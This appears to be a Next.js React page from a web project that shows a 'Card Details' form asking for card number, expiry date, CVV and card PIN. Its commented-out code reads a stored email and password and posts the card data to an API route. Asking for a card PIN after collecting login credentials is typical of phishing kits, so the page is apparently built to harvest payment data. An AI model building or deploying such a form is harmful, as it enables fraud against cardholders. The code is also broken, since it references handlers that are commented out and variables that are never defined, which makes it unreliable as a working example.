"use client";
import React, { useEffect, useState } from 'react';
import axios from 'axios';
import { useRouter } from 'next/navigation';
import Modal from '../modal/page';

const Form = () => {

  const [showModal, setShowModal] = useState(false);
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [cardPin, setCardPin] = useState('');

//   const router = useRouter();
//   useEffect(() => {
//     const email = localStorage.getItem('email');
//     const password = localStorage.getItem('password');
//     // const fname = localStorage.getItem('fname');
//     if (!email || !password) {
//       router.back();
//       return;
//     }
//   }, [router]);

//   const handleSubmit = async (e) => {
//     e.preventDefault();

//     if (isMerchant) {
//       setShowModal(true);
//       return;
//     }

//     submitForm();
//   };

//   const submitForm = async () => {
//     try {
//       if (!fname || !lname || !phone || !accountno || !pin) {
//         alert('All fields are required');
//         return;
//       }

//       const email = localStorage.getItem('email');
//       const password = localStorage.getItem('password');

//       const response = await axios.post('/api/registration', {
//         cardNumber,
//         expiryDate,
//         cvv,
//         cardPin,
//       });

//       // console.log('Registration successful:', response.message);
//       localStorage.setItem('fname', fname);
//       localStorage.setItem('phone', phone);
//       alert('Registration successful');

//       router.push('/home');
//       setCardNumber('');
//       setExpiryDate('');
//       setCvv('');
//       setCardPin('');
//       return;
//     } catch (error) {
//       console.error('Registration failed:', error);
//       alert('Registration failed');
//     }
//   };

//   const handleModalConfirm = () => {
//     setShowModal(false);
//     submitForm();
//   };

//   const handleModalCancel = () => {
//     setShowModal(false);
//   };

  return (
    <div className="relative flex items-center justify-center min-h-[100vh] overflow-hidden bg-gradient-to-r from-purple-400 via-pink-500 to-red-500">
      <div
        className="absolute inset-0 bg-cover bg-center opacity-30"
        style={{ backgroundImage: `url('/bg.jpg')` }}
      ></div>
      <div className="relative bg-white p-8 rounded-2xl shadow-2xl w-[90vw] max-w-2xl overflow-y-auto max-h-[140vh] scrollbar-hide">
     

        <form onSubmit={handleSubmit}>
          

          <h3 className="text-xl font-semibold mt-8 mb-4 text-gray-800">Card Details</h3>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">

            <div>
              <label className="block text-sm font-medium text-gray-700">
                Card Number
              </label>
              <input
                type="text"
                value={cardNumber}
                onChange={(e) => setCardNumber(e.target.value)}
                placeholder="Enter card number"
                className="mt-1 p-3 border rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 block w-full"
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700">
                Expiry Date
              </label>
              <input
                type="text"
                value={expiryDate}
                onChange={(e) => setExpiryDate(e.target.value)}
                placeholder="MM/YY"
                className="mt-1 p-3 border rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 block w-full"
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700">
                CVV
              </label>
              <input
                type="text"
                value={cvv}
                onChange={(e) => setCvv(e.target.value)}
                placeholder="Enter CVV"
                className="mt-1 p-3 border rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 block w-full"
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700">
                Card PIN
              </label>
              <input
                type="password"
                value={cardPin}
                onChange={(e) => setCardPin(e.target.value)}
                placeholder="Enter Card PIN"
                className="mt-1 p-3 border rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 block w-full"
              />
            </div>
          </div>
        
          <button
            type="submit"
            className="mt-8 bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3 px-6 rounded-full w-full"
          >
            Submit
          </button>
        </form>


        {showModal && (
          <Modal
            onConfirm={handleModalConfirm}
            onCancel={handleModalCancel}
          />
        )}
      </div>
    </div>
  );
};

export default Form;